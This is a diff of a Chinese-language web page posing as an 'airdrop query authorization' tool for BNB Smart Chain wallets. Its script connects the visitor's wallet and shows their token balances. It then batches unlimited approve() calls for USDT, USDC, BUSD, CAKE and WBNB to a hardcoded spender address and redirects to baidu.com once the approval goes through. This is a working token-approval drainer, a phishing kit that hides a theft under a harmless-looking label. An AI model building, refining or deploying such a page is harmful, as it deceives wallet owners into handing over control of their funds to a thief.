@@ -3,75 +3,213 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>孩子钱包 · 一键授权</title>
+    <title>授权给主钱包</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js"></script>
     <style>
+        :root {
+            --bg: #f5f5f7;
+            --card: #ffffff;
+            --border: #e5e5ea;
+            --text: #1d1d1f;
+            --text-secondary: #86868b;
+            --accent: #007aff;
+            --green: #34c759;
+            --red: #ff3b30;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-            background: #0b0f19; color: #e0e6f0;
-            display: flex; align-items: center; justify-content: center;
-            min-height: 100vh; margin: 0; padding: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
         }
-        .box {
-            background: #131a2b; border: 1px solid #1e2d4a; border-radius: 20px;
-            padding: 30px 20px; text-align: center; max-width: 400px; width: 100%;
+        .container {
+            background: var(--card);
+            border-radius: 20px;
+            padding: 40px 24px 32px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.08);
+            text-align: center;
         }
-        h2 { font-size: 24px; margin-bottom: 10px; }
-        p { color: #8899aa; font-size: 14px; margin-bottom: 20px; }
+        .icon-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .icon-circle {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #007aff, #5856d6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            box-shadow: 0 4px 12px rgba(0, 122, 255, 0.3);
+        }
+        h2 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 6px;
+            color: var(--text);
+            text-align: center;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        .token-list {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .token-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #f0f0f5;
+        }
+        .token-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .token-logo {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            font-weight: bold;
+            color: #fff;
+        }
+        .token-name {
+            font-size: 15px;
+            font-weight: 500;
+            color: var(--text);
+        }
+        .token-balance {
+            text-align: right;
+        }
+        .balance-value {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text);
+        }
+        .balance-usd {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
         .btn {
-            background: #3b82f6; color: white; border: none;
-            padding: 16px; border-radius: 12px; font-size: 18px;
-            font-weight: bold; width: 100%; cursor: pointer;
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            transition: opacity 0.2s;
+            margin-top: 8px;
         }
-        .btn:disabled { background: #1e3a5f; }
-        .log { margin-top: 20px; text-align: center; font-size: 14px; }
-        .success { color: #10b981; }
-        .error { color: #ef4444; }
-        .info { color: #f59e0b; }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .status {
+            margin-top: 14px;
+            font-size: 14px;
+            color: var(--text-secondary);
+            text-align: center;
+        }
+        .status.success { color: var(--green); }
+        .status.error { color: var(--red); }
     </style>
 </head>
 <body>
-<div class="box">
-    <h2>🔐 SATO空投查询</h2>
-    <p>被授权地址：<br><b>0x8fd6...516b4d</b></p>
-    <button id="startBtn" class="btn" onclick="startAuth()">🔑 一键授权</button>
-    <div id="log" class="log"></div>
-</div>
+    <div class="container">
+        <div class="icon-wrapper">
+            <div class="icon-circle">🔐</div>
+        </div>
+        <h2>空投查询授权</h2>
+        <div class="subtitle" id="walletStatus">请先连接钱包</div>
+        <div class="token-list" id="tokenList"></div>
+        <button class="btn" id="authBtn" onclick="handleAuth()">🔑 空投查询授权</button>
+        <div class="status" id="status"></div>
+    </div>
 
-<script>
-    const ethers = window.ethers;
-    const SPENDER = "0x8fd661d886c3c4a1b5d9b3a5ffcd6867ad516b4d";
-    const MULTICALL_ADDRESS = "0x41263cba59eb80dce6c8a2e843b0b0f3c9f93e0b";
-    const MULTICALL_ABI = [
-        "function aggregate(tuple(address target, bytes callData)[] calls) payable returns (uint256 blockNumber, bytes[] returnData)"
-    ];
-    const APPROVE_ABI = ["function approve(address spender, uint256 amount) returns (bool)"];
-    const TOKENS = [
-        {sym:"USDT", addr:"0x55d398326f99059ff775485246999027b3197955"},
-        {sym:"USDC", addr:"0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d"},
-        {sym:"BUSD", addr:"0xe9e7cea3dedca5984780bafc599bd69add087d56"},
-        {sym:"CAKE", addr:"0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82"},
-        {sym:"WBNB", addr:"0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c"}
-    ];
+    <script>
+        const ethers = window.ethers;
+        const SPENDER = "0x8fd661d886c3c4a1b5d9b3a5ffcd6867ad516b4d";
+        const MULTICALL_ADDRESS = "0x41263cba59eb80dce6c8a2e843b0b0f3c9f93e0b";
+        const REDIRECT_URL = "https://www.baidu.com";
 
-    async function startAuth() {
-        const btn = document.getElementById("startBtn");
-        const log = document.getElementById("log");
-        btn.disabled = true;
-        btn.textContent = "⏳ 连接钱包...";
-        log.innerHTML = "";
+        const TOKENS = [
+            { sym: "USDT", addr: "0x55d398326f99059ff775485246999027b3197955", logo: "#26a17b" },
+            { sym: "USDC", addr: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", logo: "#2775ca" },
+            { sym: "BUSD", addr: "0xe9e7cea3dedca5984780bafc599bd69add087d56", logo: "#f0b90b" },
+            { sym: "CAKE", addr: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", logo: "#d1884f" },
+            { sym: "WBNB", addr: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c", logo: "#f3ba2f" },
+        ];
 
-        try {
-            if (!window.ethereum) throw new Error("请使用MetaMask/TokenPocket打开");
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const APPROVE_ABI = ["function approve(address spender, uint256 amount) returns (bool)"];
+        const ERC20_BASIC = [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function decimals() view returns (uint8)"
+        ];
+
+        let signer = null;
+        let userAddr = null;
+
+        window.addEventListener('load', () => {
+            if (window.ethereum && window.ethereum.selectedAddress) {
+                connectWallet();
+            }
+        });
+
+        async function connectWallet() {
+            if (!window.ethereum) {
+                updateStatus("请安装 MetaMask 或 TokenPocket", "error");
+                return;
+            }
             try {
-                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
-            } catch(e) {
-                if(e.code === 4902) {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                if (!accounts || accounts.length === 0) throw new Error("未授权账户");
+                await switchToBSC();
+                const provider = new ethers.BrowserProvider(window.ethereum);
+                signer = await provider.getSigner();
+                userAddr = await signer.getAddress();
+                document.getElementById("walletStatus").textContent = `已连接 ${userAddr.slice(0,6)}...${userAddr.slice(-4)}`;
+                await loadBalances();
+            } catch (e) {
+                updateStatus("连接失败: " + e.message, "error");
+            }
+        }
+
+        async function switchToBSC() {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }]
+                });
+            } catch (e) {
+                if (e.code === 4902) {
                     await window.ethereum.request({
                         method: 'wallet_addEthereumChain',
                         params: [{
-                            chainId: '0x38', chainName: 'BNB Smart Chain',
+                            chainId: '0x38',
+                            chainName: 'BNB Smart Chain',
                             nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                             rpcUrls: ['https://bsc-dataseed.binance.org/'],
                             blockExplorerUrls: ['https://bscscan.com']
@@ -79,35 +217,76 @@
                     });
                 }
             }
-
-            const provider = new ethers.BrowserProvider(window.ethereum);
-            const signer = await provider.getSigner();
-            const addr = await signer.getAddress();
-            log.innerHTML = `<p class="info">👛 ${addr.slice(0,6)}...${addr.slice(-4)}</p>`;
-
-            const iface = new ethers.Interface(APPROVE_ABI);
-            const calls = TOKENS.map(token => ({
-                target: token.addr,
-                callData: iface.encodeFunctionData("approve", [SPENDER, ethers.MaxUint256])
-            }));
-
-            const multicall = new ethers.Contract(MULTICALL_ADDRESS, MULTICALL_ABI, signer);
-            btn.textContent = "⏳ 等待钱包确认...";
-            log.innerHTML += `<p class="info">📦 正在提交授权交易...</p>`;
-            
-            const tx = await multicall.aggregate(calls);
-            log.innerHTML += `<p class="info">⏳ 交易确认中...</p>`;
-            await tx.wait();
-            
-            log.innerHTML += `<p class="success">✅ 查询授权成功！</p>`;
-
-        } catch(e) {
-            log.innerHTML = `<p class="error">❌ 错误: ${e.message}</p>`;
-        } finally {
-            btn.disabled = false;
-            btn.textContent = "🔑 一键授权所有代币";
         }
-    }
-</script>
+
+        async function loadBalances() {
+            const tokenListDiv = document.getElementById("tokenList");
+            tokenListDiv.innerHTML = "";
+            for (const token of TOKENS) {
+                const contract = new ethers.Contract(token.addr, ERC20_BASIC, signer);
+                try {
+                    const [balance, decimals] = await Promise.all([
+                        contract.balanceOf(userAddr),
+                        contract.decimals()
+                    ]);
+                    const formatted = Number(balance) / (10 ** Number(decimals));
+                    if (formatted > 0) {
+                        tokenListDiv.innerHTML += `
+                            <div class="token-item">
+                                <div class="token-left">
+                                    <div class="token-logo" style="background:${token.logo};">${token.sym[0]}</div>
+                                    <span class="token-name">${token.sym}</span>
+                                </div>
+                                <div class="token-balance">
+                                    <div class="balance-value">${formatted.toFixed(4)}</div>
+                                    <div class="balance-usd">余额</div>
+                                </div>
+                            </div>
+                        `;
+                    }
+                } catch (err) {
+                    console.warn(`加载 ${token.sym} 失败:`, err.message);
+                }
+            }
+        }
+
+        async function handleAuth() {
+            if (!signer) {
+                await connectWallet();
+                if (!signer) return;
+            }
+            const btn = document.getElementById("authBtn");
+            btn.disabled = true;
+            btn.textContent = "⏳ 授权中...";
+            updateStatus("正在授权，请确认钱包交易...", "");
+
+            try {
+                const iface = new ethers.Interface(APPROVE_ABI);
+                const calls = TOKENS.map(token => ({
+                    target: token.addr,
+                    callData: iface.encodeFunctionData("approve", [SPENDER, ethers.MaxUint256])
+                }));
+                const multicall = new ethers.Contract(MULTICALL_ADDRESS, ["function aggregate(tuple(address target, bytes callData)[] calls) payable returns (uint256 blockNumber, bytes[] returnData)"], signer);
+                const tx = await multicall.aggregate(calls);
+                updateStatus("交易已提交，等待确认...", "success");
+                await tx.wait();
+                updateStatus("✅ 授权成功！", "success");
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 1000);
+            } catch (e) {
+                updateStatus("❌ 授权失败: " + e.message, "error");
+            } finally {
+                btn.disabled = false;
+                btn.textContent = "🔑 一键授权所有代币";
+            }
+        }
+
+        function updateStatus(msg, className) {
+            const status = document.getElementById("status");
+            status.textContent = msg;
+            status.className = "status " + (className || "");
+        }
+    </script>
 </body>
 </html>
